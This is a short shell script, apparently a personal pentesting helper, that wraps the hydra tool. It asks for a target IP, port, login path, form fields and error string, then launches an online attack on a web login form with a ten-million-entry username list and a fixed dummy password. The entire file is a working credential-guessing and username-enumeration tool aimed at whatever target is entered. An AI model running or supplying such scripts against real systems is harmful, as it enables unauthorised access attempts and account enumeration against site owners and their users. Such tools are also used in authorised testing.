#!/bin/sh

#MAKE A PART THAT ADDS A PREFIX OR SUFFIX

UNAME="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"

echo "ENTER IP: "

read IP

echo "ENTER PORT: "

read PORT

echo "Enter Directory to login panel only: "

read DIR

echo "Enter parameters (user=^USER^&pass=^PASS^): "

read PARAMS

echo "Enter error message: "

read MESSAGE

hydra -L $UNAME -p "bogus" $IP -s $PORT http-post-form "$DIR:$PARAMS:F=$MESSAGE" -vV -t 4 

